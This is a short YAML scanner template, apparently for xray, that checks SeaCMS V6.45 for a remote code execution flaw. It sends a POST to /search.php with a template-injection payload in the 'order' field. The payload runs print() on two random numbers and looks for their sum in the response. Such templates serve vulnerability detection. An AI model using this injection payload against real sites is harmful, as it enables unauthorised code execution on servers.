expression: r0()
id: seacmsv645-command-exec
info:
  author: Facker007(https://github.com/Facker007)
  name: SeaCMS V645 RCE
  severity: high
rules:
  r0:
    expression: response.body.bcontains(bytes(string(rand1 + rand2)))
    request:
      body: searchtype=5&order=}{end if} {if:1)print({{rand1}}%2b{{rand2}});if(1}{end
        if}
      method: POST
      path: /search.php?searchtype=5
set:
  rand1: randomInt(200000000, 210000000)
  rand2: randomInt(200000000, 210000000)
